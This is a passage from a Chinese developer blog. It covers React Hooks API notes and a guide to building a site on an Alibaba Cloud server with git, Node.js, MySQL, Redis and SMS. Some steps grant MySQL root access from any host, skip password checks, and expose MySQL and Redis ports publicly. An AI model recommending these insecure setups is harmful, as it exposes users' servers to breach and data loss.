class="built_in">Error</span>();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Counter</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> [state, dispatch] = useReducer(reducer, initialState);</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    &lt;&gt;</span><br><span class="line">      Count: &#123;state.count&#125;</span><br><span class="line">      &lt;button onClick=&#123;() =&gt; dispatch(&#123;<span class="attr">type</span>: <span class="string">'decrement'</span>&#125;)&#125;&gt;-&lt;<span class="regexp">/button&gt;</span></span><br><span class="line"><span class="regexp">      &lt;button onClick=&#123;() =&gt; dispatch(&#123;type: 'increment'&#125;)&#125;&gt;+&lt;/</span>button&gt;</span><br><span class="line">    &lt;<span class="regexp">/&gt;</span></span><br><span class="line"><span class="regexp">  );</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br></pre></td></tr></table></figure></p>
<h3 id="惰性初始化"><a href="#惰性初始化" class="headerlink" title="惰性初始化"></a>惰性初始化</h3><p>你可以选择惰性地创建初始state。为此，需要将init函数作为useReducer的第三个参数传入，这样初始state将被设置为init(initialArg)。</p>
<h3 id="跳过dispatch"><a href="#跳过dispatch" class="headerlink" title="跳过dispatch"></a>跳过dispatch</h3><p>如果Reducer Hook的返回值与当前state相同，React将跳过子组件的渲染及副作用的执行。（React使用Object.is比较算法来比较state。）</p>
<h2 id="useCallback"><a href="#useCallback" class="headerlink" title="useCallback"></a>useCallback</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> memoizedCallback = useCallback(</span><br><span class="line">  () =&gt; &#123;</span><br><span class="line">    doSomething(a, b);</span><br><span class="line">  &#125;,</span><br><span class="line">  [a, b],</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
<p>把内联回调函数及依赖项数组作为参数传入useCallback，它将返回该回调函数的memoized版本，该回调函数仅在某个依赖项改变时才会更新。当你把回调函数传递给经过优化的并使用引用相等性去避免非必要渲染（例如shouldComponentUpdate）的子组件时，它将非常有用。</p>
<p>useCallback(fn, deps)相当于useMemo(() =&gt; fn, deps)。</p>
<h2 id="useMemo"><a href="#useMemo" class="headerlink" title="useMemo"></a>useMemo</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> memoizedValue = useMemo(<span class="function"><span class="params">()</span> =&gt;</span> computeExpensiveValue(a, b), [a, b]);</span><br></pre></td></tr></table></figure>
<p>把“创建”函数和依赖项数组作为参数传入useMemo，它仅会在某个依赖项改变时才重新计算 memoized值。这种优化有助于避免在每次渲染时都进行高开销的计算。</p>
<h2 id="useRef"><a href="#useRef" class="headerlink" title="useRef"></a>useRef</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> refContainer = useRef(initialValue);</span><br></pre></td></tr></table></figure>
<p>useRef 返回一个可变的ref对象，其.current 属性被初始化为传入的参数（initialValue）。返回的ref对象在组件的整个生命周期内保持不变。</p>
<p>一个常见的用例便是命令式地访问子组件：<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">TextInputWithFocusButton</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> inputEl = useRef(<span class="literal">null</span>);</span><br><span class="line">  <span class="keyword">const</span> onButtonClick = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// `current` 指向已挂载到 DOM 上的文本输入元素</span></span><br><span class="line">    inputEl.current.focus();</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    &lt;&gt;</span><br><span class="line">      &lt;input ref=&#123;inputEl&#125; type=<span class="string">"text"</span> /&gt;</span><br><span class="line">      &lt;button onClick=&#123;onButtonClick&#125;&gt;Focus the input&lt;<span class="regexp">/button&gt;</span></span><br><span class="line"><span class="regexp">    &lt;/</span>&gt;</span><br><span class="line">  );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>请记住，当 ref 对象内容发生变化时，useRef 并不会通知你。变更 .current 属性不会引发组件重新渲染。如果想要在 React 绑定或解绑 DOM 节点的 ref 时运行某些代码，则需要使用回调 ref 来实现。</p>
<h2 id="useImperativeHandle"><a href="#useImperativeHandle" class="headerlink" title="useImperativeHandle"></a>useImperativeHandle</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">useImperativeHandle(ref, createHandle, [deps])</span><br></pre></td></tr></table></figure>
<p>useImperativeHandle可以让你在使用ref时自定义暴露给父组件的实例值。在大多数情况下，应当避免使用ref这样的命令式代码。useImperativeHandle应当与forwardRef一起使用：<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">FancyInput</span>(<span class="params">props, ref</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> inputRef = useRef();</span><br><span class="line">  useImperativeHandle(ref, () =&gt; (&#123;</span><br><span class="line">    focus: <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">      inputRef.current.focus();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;));</span><br><span class="line">  <span class="keyword">return</span> <span class="xml"><span class="tag">&lt;<span class="name">input</span> <span class="attr">ref</span>=<span class="string">&#123;inputRef&#125;</span> <span class="attr">...</span> /&gt;</span></span>;</span><br><span class="line">&#125;</span><br><span class="line">FancyInput = forwardRef(FancyInput);</span><br></pre></td></tr></table></figure></p>
<p>在本例中，渲染<code>&lt;FancyInput ref={inputRef} /&gt;</code>的父组件可以调用 inputRef.current.focus()。</p>
<h2 id="useLayoutEffect"><a href="#useLayoutEffect" class="headerlink" title="useLayoutEffect"></a>useLayoutEffect</h2><p>其函数签名与useEffect相同，但它会在所有的DOM变更之后同步调用effect。可以使用它来读取DOM布局并同步触发重渲染。在浏览器执行绘制之前，useLayoutEffect内部的更新计划将被同步刷新。</p>
<h2 id="useDebugValue"><a href="#useDebugValue" class="headerlink" title="useDebugValue"></a>useDebugValue</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">useDebugValue(value)</span><br></pre></td></tr></table></figure>
<p>useDebugValue可用于在React开发者工具中显示自定义hook的标签。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">useFriendStatus</span>(<span class="params">friendID</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> [isOnline, setIsOnline] = useState(<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 在开发者工具中的这个 Hook 旁边显示标签</span></span><br><span class="line">  <span class="comment">// e.g. "FriendStatus: Online"</span></span><br><span class="line">  useDebugValue(isOnline ? <span class="string">'Online'</span> : <span class="string">'Offline'</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> isOnline;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>推荐你向每个自定义Hook添加debug值。当它作为共享库的一部分时才最有价值。</p>
<h3 id="延迟格式化debug值"><a href="#延迟格式化debug值" class="headerlink" title="延迟格式化debug值"></a>延迟格式化debug值</h3><p>useDebugValue接受一个格式化函数作为可选的第二个参数。该函数只有在Hook被检查时才会被调用。它接受debug值作为参数，并且会返回一个格式化的显示值。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">useDebugValue(date, date =&gt; date.toDateString());</span><br></pre></td></tr></table></figure></p>
]]></content>
      <categories>
        <category>前端</category>
      </categories>
      <tags>
        <tag>react</tag>
      </tags>
  </entry>
  <entry>
    <title>阿里云</title>
    <url>/2019/10/14/%E9%98%BF%E9%87%8C%E4%BA%91/</url>
    <content><![CDATA[<p>阿里云服务器（裸机）建站指南</p>
<a id="more"></a>
<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>一年前在阿里云上买了一台1核2G的服务器，利用业余时间也做了一些东西：<a href="https://www.readingblog.cn" target="_blank" rel="noopener">站点</a> <a href="https://www.readingblog.cn、微信小程序（积木小盒）等等。" target="_blank" rel="noopener">https://www.readingblog.cn、微信小程序（积木小盒）等等。</a></p>
<p>目前小程序流量主已经有少量收益，能维持收支平衡了。同时也积累了一些服务器建站和运维经验，所以想着在这篇文章中集中做一些整理。</p>
<h1 id="起步"><a href="#起步" class="headerlink" title="起步"></a>起步</h1><p>先在阿里云官网[<a href="https://www.aliyun.com]" target="_blank" rel="noopener">https://www.aliyun.com]</a> 选择适合自己的云服务器ECS，然后按照购买流程走即可。</p>
<p>购买完毕，就可以使用你的服务器了。点击控制台，再选择左侧栏的云服务器ECS，就可以进到云服务器控制台。</p>
<p>点击左侧栏的实例，初始化一下密码。初始化后需要重启一下。</p>
<p><img src="https://mfaying.github.io/static/images/aliyun/1.jpg" alt="avatar"></p>
<p>密码初始化后就可以远程连接服务器了。（建议密码设置得复杂一些，自己之前由于密码设置得过于简单而被其他人登录过）</p>
<p><img src="https://mfaying.github.io/static/images/aliyun/2.jpg" alt="avatar"></p>
<h1 id="安装git"><a href="#安装git" class="headerlink" title="安装git"></a>安装git</h1><p>在服务器上安装git可以让你很方便地更新代码，部署服务。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo wget https://www.kernel.org/pub/software/scm/git/git-2.8.0.tar.gz</span><br></pre></td></tr></table></figure>
<p>下载相关依赖</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo yum -y install zlib-devel openssl-devel cpio expat-devel</span><br></pre></td></tr></table></figure>
<p>解压</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo tar -zxvf git-2.8.0.tar.gz</span><br></pre></td></tr></table></figure>
<p>编译</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd git-2.8.0</span><br><span class="line">make configure</span><br><span class="line">./configure</span><br><span class="line">make</span><br><span class="line">make install</span><br><span class="line">echo &quot;export PATH=$PATH:/usr/local/git/bin&quot; &gt;&gt; /etc/bashrc</span><br><span class="line">source /etc/bashrc</span><br></pre></td></tr></table></figure>
<p>在这些过程中可能会出现一些错误，</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">autoconf: command not found (centos 6.7 install git-2.10.0 from source code)  </span><br><span class="line">  解决方法:yum  install autoconf</span><br><span class="line">make[1]: *** [perl.mak] Error 2 </span><br><span class="line">  解决方法:yum install perl-ExtUtils-MakeMaker package</span><br><span class="line"></span><br><span class="line">git clone出现https错误：(重新编译即可)</span><br><span class="line">  解决方法:</span><br><span class="line">yum install curl-devel</span><br><span class="line">cd home/developer/setup/git-2.8.0 //这里就是到放git的地方就好</span><br><span class="line">  ./configure</span><br><span class="line">make</span><br><span class="line">  make install</span><br></pre></td></tr></table></figure>
<h1 id="安装node-js"><a href="#安装node-js" class="headerlink" title="安装node.js"></a>安装node.js</h1><p>笔者主要研究前端，所以服务端语言以node.js为主。</p>
<p>如何安装node.js可以参见阿里云文档，可以修改版本为较新的node.js版本，当然也可以使用nvm来管理node.js的版本。</p>
<p>安装完node.js以后，我们稍微修改一下node.js官方文档的例子，来启动一个http服务器。</p>
<p>代码如下</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// server.js</span></span><br><span class="line"><span class="keyword">const</span> http = <span class="built_in">require</span>(<span class="string">'http'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> hostname = <span class="string">'0.0.0.0'</span>;</span><br><span class="line"><span class="keyword">const</span> port = <span class="number">3001</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> server = http.createServer(<span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  res.statusCode = <span class="number">200</span>;</span><br><span class="line">  res.setHeader(<span class="string">'Content-Type'</span>, <span class="string">'text/plain'</span>);</span><br><span class="line">  res.end(<span class="string">'Hello, World!\n'</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">server.listen(port, hostname, () =&gt; &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">`Server running at http://<span class="subst">$&#123;hostname&#125;</span>:<span class="subst">$&#123;port&#125;</span>/`</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>启动服务器</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[root@iZ8vbfhrv1vsbp44n9fdtoZ start]# node server.js</span><br><span class="line">Server running at http://0.0.0.0:3001/</span><br></pre></td></tr></table></figure>
<p>你还需要添加安全组规则，打开服务器防火墙上的3001端口。具体操作如下</p>
<p>在实例列表页点击”更多”,找到安全组配置</p>
<p><img src="https://mfaying.github.io/static/images/aliyun/3.jpg" alt="avatar"></p>
<p>点击配置规则</p>
<p><img src="https://mfaying.github.io/static/images/aliyun/4.jpg" alt="avatar"></p>
<p>点击快速创建规则</p>
<p><img src="https://mfaying.github.io/static/images/aliyun/5.jpg" alt="avatar"></p>
<p>具体配置如下</p>
<p><img src="https://mfaying.github.io/static/images/aliyun/6.jpg" alt="avatar"></p>
<p>配置完毕后，就可以调用接口了。</p>
<p><img src="https://mfaying.github.io/static/images/aliyun/7.jpg" alt="avatar"></p>
<h1 id="mysql"><a href="#mysql" class="headerlink" title="mysql"></a>mysql</h1><p>要处理一些业务数据，mysql是必需的。</p>
<h2 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h2><p>使用yum下载</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget -i -c http://dev.mysql.com/get/mysql57-community-release-el7-10.noarch.rpm</span><br><span class="line">yum -y install mysql57-community-release-el7-10.noarch.rpm</span><br><span class="line">yum -y install mysql-community-server</span><br></pre></td></tr></table></figure>
<p>速度比较慢，需要耐心等待。</p>
<h2 id="启停mysql服务"><a href="#启停mysql服务" class="headerlink" title="启停mysql服务"></a>启停mysql服务</h2><p>启动</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[root@iZ8vbfhrv1vsbp44n9fdtoZ ~]# systemctl start  mysqld.service</span><br></pre></td></tr></table></figure>
<p>使用ps -ef | grep mysql查看，发现mysql服务已经启动了。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[root@iZ8vbfhrv1vsbp44n9fdtoZ ~]# ps -ef | grep mysql</span><br><span class="line">mysql    21709     1  6 10:58 ?        00:00:00 /usr/sbin/mysqld --daemonize --pid-file=/var/run/mysqld/mysqld.pid</span><br><span class="line">root     21738 21649  0 10:58 pts/0    00:00:00 grep --color=auto mysql</span><br></pre></td></tr></table></figure>
<p>停止</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[root@iZ8vbfhrv1vsbp44n9fdtoZ ~]# systemctl stop  mysqld.service</span><br></pre></td></tr></table></figure>
<p>mysql服务停止了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[root@iZ8vbfhrv1vsbp44n9fdtoZ ~]# ps -ef | grep mysql</span><br><span class="line">root     21747 21649  0 10:58 pts/0    00:00:00 grep --color=auto mysql</span><br><span class="line">[root@iZ8vbfhrv1vsbp44n9fdtoZ ~]# systemctl start  mysqld.service</span><br></pre></td></tr></table></figure>
<h2 id="重设root密码，设置远程登录权限"><a href="#重设root密码，设置远程登录权限" class="headerlink" title="重设root密码，设置远程登录权限"></a>重设root密码，设置远程登录权限</h2><p>先设置免密登录</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim /etc/my.cnf</span><br></pre></td></tr></table></figure>
<p>在mysqld下面添加<br>skip-grant-tables</p>
<p>保存后重启mysql，这时就可以跳过密码来登录mysql了</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl stop  mysqld.service</span><br><span class="line">systemctl start  mysqld.service</span><br><span class="line">mysql</span><br></pre></td></tr></table></figure>
<p>先刷新</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt;flush privileges;</span><br></pre></td></tr></table></figure>
<p>创建用户</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt;create user &apos;root&apos;@&apos;localhost&apos; identified by &apos;你的密码&apos;;</span><br></pre></td></tr></table></figure>
<p>允许root用户远程登录</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt;grant all privileges on *.* to &apos;root&apos;@&apos;%&apos; identified by &apos;你的密码&apos;;</span><br></pre></td></tr></table></figure>
<p>刷新</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt;flush privileges;</span><br></pre></td></tr></table></figure>
<p>去掉my.cnf里的免密设置,使用密码登录</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mysql -u root -p <span class="string">'你的密码'</span></span><br></pre></td></tr></table></figure>
<p>最后，你还需要按照之前的方法添加安全组规则，打开服务器防火墙上的3306端口。</p>
<p>配置完毕后你就可以在本地远程连接服务器上的mysql了。（建议mysql的密码设置得复杂些，平时关闭3306端口，这样通过外网就无法直接连接mysql了，同时还要使用oss将mysql的数据做好备份以确保安全。之前mysql的密码被黑客破解了，所有库表都被删了，惨痛的教训）。</p>
<h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p>我用的是Sequelize包，它是基于promise的，支持es6语法。除了mysql，它还可以用于连接Postgres、MariaDB、SQLite和Microsoft SQL Server。(<a href="https://www.npmjs.com/package/sequelize" target="_blank" rel="noopener">https://www.npmjs.com/package/sequelize</a>)</p>
<p>结合开发文档，我们就可以进行实际开发了。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> Sequelize = <span class="built_in">require</span>(<span class="string">'sequelize'</span>);</span><br><span class="line"><span class="keyword">const</span> config = <span class="built_in">require</span>(<span class="string">'../config'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> logger = <span class="built_in">require</span>(<span class="string">'log4js'</span>).getLogger(<span class="string">'app'</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MysqlClient</span> </span>&#123;</span><br><span class="line">  <span class="keyword">constructor</span>() &#123;</span><br><span class="line">    <span class="keyword">if</span> (!MysqlClient.instance) &#123;</span><br><span class="line">      <span class="keyword">this</span>.client = <span class="keyword">new</span> Sequelize(config.mysql.database, config.mysql.username, config.mysql.password, &#123;</span><br><span class="line">        host: config.mysql.host,</span><br><span class="line">        port: config.mysql.port,</span><br><span class="line">        dialect: <span class="string">'mysql'</span>,</span><br><span class="line">        pool: &#123;</span><br><span class="line">          max: <span class="number">5</span>,</span><br><span class="line">          min: <span class="number">0</span>,</span><br><span class="line">          idle: <span class="number">10000</span>,</span><br><span class="line">        &#125;,</span><br><span class="line">        timezone: <span class="string">'+08:00'</span>,</span><br><span class="line">      &#125;);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">const</span> client = <span class="keyword">this</span>.client;</span><br><span class="line">      MysqlClient.instance = client;</span><br><span class="line"></span><br><span class="line">      client</span><br><span class="line">      .authenticate()</span><br><span class="line">      .then(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">        logger.info(<span class="string">'Connection has been established successfully.'</span>);</span><br><span class="line">      &#125;)</span><br><span class="line">      .catch(<span class="function"><span class="params">err</span> =&gt;</span> &#123;</span><br><span class="line">        logger.info(<span class="string">'Unable to connect to the database:'</span>, err);</span><br><span class="line">      &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = <span class="keyword">new</span> MysqlClient().client;</span><br></pre></td></tr></table></figure></p>
<h1 id="redis"><a href="#redis" class="headerlink" title="redis"></a>redis</h1><h2 id="下载和编译"><a href="#下载和编译" class="headerlink" title="下载和编译"></a>下载和编译</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget http://download.redis.io/releases/redis-4.0.2.tar.gz</span><br><span class="line">tar xzf redis-4.0.2.tar.gz</span><br><span class="line"><span class="built_in">cd</span> redis-4.0.2</span><br><span class="line">make</span><br></pre></td></tr></table></figure>
<h2 id="启动服务"><a href="#启动服务" class="headerlink" title="启动服务"></a>启动服务</h2><p>后台启动redis</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> redis-4.0.2/</span><br><span class="line">src/redis-server &amp;</span><br></pre></td></tr></table></figure>
<p>查询redis进程</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ps -ef | grep redis</span><br></pre></td></tr></table></figure>
<p>可以看到redis已经启动了</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root     19141 19065  0 12:50 pts/1    00:00:03 ./src/redis-server 0.0.0.0:6379</span><br><span class="line">root     19238 19196  0 14:00 pts/0    00:00:00 grep --color=auto redis</span><br></pre></td></tr></table></figure>
<p>结束进程</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">kill</span> -9 pid</span><br></pre></td></tr></table></figure>
<h2 id="简单测试"><a href="#简单测试" class="headerlink" title="简单测试"></a>简单测试</h2><p>启动redis客户端</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> redis-4.0.2/</span><br><span class="line">src/redis-cli</span><br><span class="line">127.0.0.1:6379&gt; <span class="built_in">set</span> <span class="built_in">test</span> 1</span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379&gt; get <span class="built_in">test</span></span><br><span class="line"><span class="string">"1"</span></span><br></pre></td></tr></table></figure>
<p>redis安装成功了。</p>
<h2 id="配置服务器远程连接"><a href="#配置服务器远程连接" class="headerlink" title="配置服务器远程连接"></a>配置服务器远程连接</h2><p>默认配置只能是本地访问，我们修改redis-4.0.2/redis.conf配置文件</p>
<p>将</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bind 127.0.0.1</span><br></pre></td></tr></table></figure>
<p>修改为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bind 0.0.0.0</span><br></pre></td></tr></table></figure>
<p>你需要添加安全组规则，打开服务器防火墙上的6379端口。</p>
<h2 id="设置远程连接密码"><a href="#设置远程连接密码" class="headerlink" title="设置远程连接密码"></a>设置远程连接密码</h2><p>默认配置开启了保护模式</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">protected-mode yes</span><br></pre></td></tr></table></figure>
<p>这时你需要设置密码才可以远程连接上redis，密码设置非常简单，只需要在requirepass字段上填写你的密码即可</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">requirepass 你的密码</span><br></pre></td></tr></table></figure>
<p>配置完毕，后台启动你的redis可以了。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./opt/software/redis-4.0.2/src/redis-server /opt/software/redis-4.0.2/redis.conf &amp;</span><br></pre></td></tr></table></figure>
<h2 id="node客户端连接"><a href="#node客户端连接" class="headerlink" title="node客户端连接"></a>node客户端连接</h2><p>我用的是redis包，根据前面你的配置就可以远程连接服务器上的redis了。结合<a href="https://www.npmjs.com/package/redis" target="_blank" rel="noopener">开发文档</a>，就可以进行实际开发了。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> redis = <span class="built_in">require</span>(<span class="string">'redis'</span>);</span><br><span class="line"><span class="keyword">const</span> config = <span class="built_in">require</span>(<span class="string">'../config'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> logger = <span class="built_in">require</span>(<span class="string">'log4js'</span>).getLogger(<span class="string">'app'</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RedisClient</span> </span>&#123;</span><br><span class="line">  <span class="keyword">constructor</span>() &#123;</span><br><span class="line">    <span class="keyword">if</span> (!RedisClient.instance) &#123;</span><br><span class="line">      <span class="keyword">this</span>.client = redis.createClient(&#123;</span><br><span class="line">        host: config.redis.host,</span><br><span class="line">        port: config.redis.port,</span><br><span class="line">        password: config.redis.password,</span><br><span class="line">      &#125;);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">const</span> client = <span class="keyword">this</span>.client;</span><br><span class="line">      RedisClient.instance = client;</span><br><span class="line">  </span><br><span class="line">      client.on(<span class="string">"error"</span>, (err) =&gt; &#123;</span><br><span class="line">        logger.error(<span class="string">'redis connect err: %s'</span>, err.toString());</span><br><span class="line">      &#125;);</span><br><span class="line">      </span><br><span class="line">      client.on(<span class="string">"connect"</span>, () =&gt; &#123;</span><br><span class="line">        logger.info(<span class="string">'redis connect success'</span>);</span><br><span class="line">      &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = <span class="keyword">new</span> RedisClient().client;</span><br></pre></td></tr></table></figure>
<h1 id="短信服务"><a href="#短信服务" class="headerlink" title="短信服务"></a>短信服务</h1><p>如果你购买了阿里云的短信服务，就可以通过短信API实现验证码、推广短信、通知短信的发送功能了。</p>
<p>这里以验证码为例，介绍一下短信的发送功能。</p>
<h2 id="快速学习"><a href="#快速学习" class="headerlink" title="快速学习"></a>快速学习</h2><p>进入快速学习页面(<a href="https://dysms.console.aliyun.com/dysms.htm#/quickStart" target="_blank" rel="noopener">https://dysms.console.aliyun.com/dysms.htm#/quickStart</a>)</p>
<p>直接点击查看API Demo</p>
<p>你在左侧输入参数，选择不同的后端语言，它会自动帮你生成Demo代码，并且还可以去CloudShell在线调试。<br><img src="https://mfaying.github.io/static/images/aliyun/8.jpg" alt="avatar"></p>
<h2 id="参数说明"><a href="#参数说明" class="headerlink" title="参数说明"></a>参数说明</h2><p>PhoneNumbers 接收短信的手机号码<br>SignName 签名名称，在控制台国内消息签名管理一列添加、查看<br>TemplateCode 模板ID，在控制台国内消息模板管理一列添加、查看<br>TemplateParam 模板变量对应的实际值，注意一定要是JSON格式。</p>
<p>签名可以设置你的网站名、公司名</p>
<p>模板可以选择验证码、短信通知、推广短信(升级为企业后启用)，设置你的短信内容，同时支持变量替换，如我的网站的验证码短信模板内容为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">您的验证码为：$&#123;code&#125;，该验证码5分钟内有效，请勿泄漏于他人。</span><br></pre></td></tr></table></figure>
<p>TemplateParam可以设置code变量，发送你需要的内容</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="string">"TemplateParam"</span>: <span class="built_in">JSON</span>.stringify(&#123;</span><br><span class="line">  <span class="string">"code"</span>: <span class="number">2</span></span><br><span class="line">&#125;),</span><br></pre></td></tr></table></figure>
<h2 id="短信发送客户端"><a href="#短信发送客户端" class="headerlink" title="短信发送客户端"></a>短信发送客户端</h2><p>根据API Demo，我们写出自己的短信客户端代码</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> Core = <span class="built_in">require</span>(<span class="string">'@alicloud/pop-core'</span>);</span><br><span class="line"><span class="keyword">const</span> config = <span class="built_in">require</span>(<span class="string">'../config'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> requestOption = &#123;</span><br><span class="line">  method: <span class="string">'POST'</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SmsClient</span> </span>&#123;</span><br><span class="line">  <span class="keyword">constructor</span>() &#123;</span><br><span class="line">    <span class="keyword">if</span> (!SmsClient.instance) &#123;</span><br><span class="line">      <span class="keyword">this</span>.client = <span class="keyword">new</span> Core(&#123;</span><br><span class="line">        accessKeyId: config.sms.accessKeyId,</span><br><span class="line">        accessKeySecret: config.sms.accessKeySecret,</span><br><span class="line">        endpoint: config.sms.endpoint,</span><br><span class="line">        apiVersion: config.sms.apiVersion,</span><br><span class="line">      &#125;);</span><br><span class="line">      SmsClient.instance = <span class="keyword">this</span>.client;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  sendSms(params) &#123;</span><br><span class="line">    <span class="keyword">this</span>.client.request(<span class="string">'SendSms'</span>, params, requestOption).then(<span class="function">(<span class="params">result</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="built_in">console</span>.log(<span class="built_in">JSON</span>.stringify(result));</span><br><span class="line">    &#125;, (ex) =&gt; &#123;</span><br><span class="line">      <span class="built_in">console</span>.log(ex);</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = <span class="keyword">new</span> SmsClient();</span><br></pre></td></tr></table></figure>
<p>编写单元测试</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> smsClient = <span class="built_in">require</span>(<span class="string">'../../common/sms-client.js'</span>);</span><br><span class="line"></span><br><span class="line">describe(<span class="string">'smsClient'</span>,<span class="keyword">async</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  it(<span class="string">'sendSms'</span>, <span class="keyword">async</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> params = &#123;</span><br><span class="line">      <span class="string">"PhoneNumbers"</span>: <span class="string">"手机号码"</span>,</span><br><span class="line">      <span class="string">"SignName"</span>: <span class="string">"签名"</span>,</span><br><span class="line">      <span class="string">"RegionId"</span>: <span class="string">"cn-hangzhou"</span>,</span><br><span class="line">      <span class="string">"TemplateCode"</span>: <span class="string">"模板ID"</span>,</span><br><span class="line">      <span class="string">"TemplateParam"</span>: <span class="built_in">JSON</span>.stringify(&#123;</span><br><span class="line">        <span class="string">"code"</span>: <span class="number">2</span></span><br><span 